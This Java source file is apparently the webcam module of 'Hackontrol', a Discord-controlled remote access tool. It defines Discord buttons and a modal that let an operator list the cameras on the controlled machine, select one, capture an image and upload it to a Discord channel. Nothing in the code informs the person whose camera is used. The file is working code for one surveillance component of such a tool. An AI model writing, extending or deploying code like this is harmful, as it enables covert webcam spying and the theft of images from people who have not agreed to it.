package com.khopan.hackontrol.channel;

import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.CameraDevice;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.ModalContext;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;
import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
import com.khopan.hackontrol.utils.sendable.sender.ReplyCallbackSendable;

import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;
import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;

public class CameraChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "camera";

	private static final Button BUTTON_CAMERA_LIST = ButtonManager.staticButton(ButtonType.SUCCESS, "Camera List", "cameraList");
	private static final Button BUTTON_SELECT      = ButtonManager.staticButton(ButtonType.SUCCESS, "Select",      "selectCamera");
	private static final Button BUTTON_CAPTURE     = ButtonManager.staticButton(ButtonType.SUCCESS, "Capture",     "cameraCapture");
	private static final Button BUTTON_REFRESH     = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",     "refreshCameraList");

	private static final String MODAL_SELECT_CAMERA = "selectCamera";

	private CameraDevice[] devices;
	private CameraDevice selectedCamera;
	private ButtonContext selectContext;

	@Override
	public String getName() {
		return CameraChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_CAMERA_LIST,  this :: buttonCameraList);
		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_SELECT,       this :: buttonSelect);
		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_CAPTURE,      this :: buttonCapture);
		registry.register(InteractionManager.BUTTON_REGISTRY, CameraChannel.BUTTON_REFRESH,      this :: buttonRefresh);
		registry.register(InteractionManager.MODAL_REGISTRY,  CameraChannel.MODAL_SELECT_CAMERA, this :: modalSelectCamera);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(CameraChannel.BUTTON_CAMERA_LIST)).queue();
	}

	private void buttonCameraList(ButtonContext context) {
		this.devices = NativeLibrary.cameraList();
		this.sendCameraList(context);
	}

	private void buttonSelect(ButtonContext context) {
		if(this.devices == null || this.devices.length == 0) {
			HackontrolError.message(context.reply(), "No camera available");
			return;
		}

		if(this.devices.length == 1) {
			this.selectedCamera = this.devices[0];
			this.sendCameraList(context);
			HackontrolMessage.delete(context);
			return;
		} else if(this.devices.length == 2) {
			CameraDevice newSelected = null;

			if(this.devices[0].equals(this.selectedCamera)) {
				newSelected = this.devices[1];
			} else if(this.devices[1].equals(this.selectedCamera)) {
				newSelected = this.devices[0];
			}

			if(newSelected != null) {
				this.selectedCamera = newSelected;
				this.sendCameraList(context);
				HackontrolMessage.delete(context);
				return;
			}
		}

		TextInput textInput = TextInput.create("cameraIndex", "Camera Index", TextInputStyle.SHORT)
				.setRequired(true)
				.setMinLength(1)
				.setMaxLength(Integer.toString(this.devices.length).length())
				.setPlaceholder("1 - " + this.devices.length)
				.build();

		Modal modal = Modal.create(CameraChannel.MODAL_SELECT_CAMERA, "Select Camera")
				.addActionRow(textInput)
				.build();

		this.selectContext = context;
		context.replyModal(modal).queue();
	}

	private void buttonCapture(ButtonContext context) {
		if(this.selectedCamera == null) {
			HackontrolError.message(context.reply(), "No camera selected");
			return;
		}

		TimeSafeReplyHandler.start(context, consumer -> {
			try {
				MessageCreateBuilder builder = new MessageCreateBuilder();
				builder.setFiles(ScreenshotChannel.uploadImage(this.selectedCamera.capture(), "capture"));
				builder.addActionRow(CameraChannel.BUTTON_CAPTURE, HackontrolButton.delete());
				consumer.accept(builder.build());
			} catch(Throwable Errors) {
				HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(consumer), Errors);
			}
		});
	}

	private void buttonRefresh(ButtonContext context) {
		this.buttonCameraList(context);
		HackontrolMessage.delete(context);
	}

	private void modalSelectCamera(ModalContext context) {
		ModalMapping mapping = context.getValue("cameraIndex");

		if(mapping == null) {
			HackontrolError.message(context.reply(), "Camera index cannot be null");
			return;
		}

		String text = mapping.getAsString();
		int index;

		try {
			index = Integer.parseInt(text);
		} catch(Throwable Errors) {
			HackontrolError.message(context.reply(), "Invalid number format");
			return;
		}

		if(index < 1 || index > this.devices.length) {
			HackontrolError.message(context.reply(), "Index " + index + " out of bounds, expected 1 - " + this.devices.length);
			return;
		}

		this.selectedCamera = this.devices[index - 1];
		this.sendCameraList(context);
		HackontrolMessage.delete(this.selectContext);
	}

	private void sendCameraList(IReplyCallback callback) {
		if(this.devices == null || this.devices.length == 0) {
			HackontrolError.message(ReplyCallbackSendable.of(callback), "No camera available");
			return;
		}

		StringBuilder builder = new StringBuilder();
		boolean hasSelected = false;

		for(int i = 0; i < this.devices.length; i++) {
			if(i > 0) {
				builder.append('\n');
			}

			CameraDevice device = this.devices[i];
			boolean selected = device.equals(this.selectedCamera);

			if(selected) {
				builder.append("**");
			}

			builder.append('`');
			builder.append(i + 1);
			builder.append(") ");
			builder.append(device.getDeviceName());

			if(selected) {
				builder.append(" (Selected)");
			}

			builder.append('`');

			if(selected) {
				builder.append("**");
			}

			if(selected) {
				hasSelected = true;
			}
		}

		List<ItemComponent> list = new ArrayList<>();
		list.add(CameraChannel.BUTTON_SELECT);
		list.add(CameraChannel.BUTTON_REFRESH);

		if(hasSelected) {
			list.add(CameraChannel.BUTTON_CAPTURE);
		}

		list.add(HackontrolButton.delete());
		callback.reply(builder.toString()).addActionRow(list).queue(InteractionManager :: callback);
	}
}
